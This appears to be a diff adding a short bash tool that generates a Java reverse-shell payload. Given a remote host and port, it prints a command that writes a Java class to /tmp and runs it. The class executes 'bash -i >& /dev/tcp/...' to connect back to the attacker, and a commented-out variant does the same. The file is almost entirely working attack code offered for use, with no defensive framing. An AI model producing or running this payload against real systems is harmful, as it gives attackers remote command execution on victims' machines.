@@ -1,0 +1,27 @@
+#!/bin/bash
+
+function javaclass_payload(){
+
+echo "printf 'import java.io.*;\n        public class LinuxRevShellExec {\n                public static void main(String[] args) {\n                try {\n                        String[] payload = {\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/$rhost/$rport 0>&1\"};\n                        //String[] payload_b = {\"/bin/bash\", \"-c\", \"exec 5<>/dev/tcp/$rport/$rhost;cat <&5 | while read line; do \$line 2>&5 >&5; done\"};\n                        Process p = Runtime.getRuntime().exec(payload);\n                        BufferedReader in = new BufferedReader(\n                                new InputStreamReader(p.getInputStream()));\n                        String line = null;\n                         while ((line = in.readLine()) != null) {\n                                System.out.println(line);\n                        }\n                }\n		catch (IOException e) {\n                e.printStackTrace();\n                }\n        }\n}\n' > /tmp/payload.java && java /tmp/payload.java"
+
+}
+
+function Craft_linux_java_reverse_shell(){
+
+        if [ -z "$1" ] || [ -z "$2" ]
+        then
+                printf "Auto-gen Linux java reverse tcp shell\n"
+                printf "Usage bash linux_java-reverse-tcp <rhost> <rport>\n"
+                exit
+        fi
+
+        rhost="$1"
+        rport="$2"
+
+        printf "\n"
+	javaclass_payload
+	printf "\n\n[\e[0;32m+\e[0m] Payload created.\n"
+
+}
+
+Craft_linux_java_reverse_shell "$1" "$2"
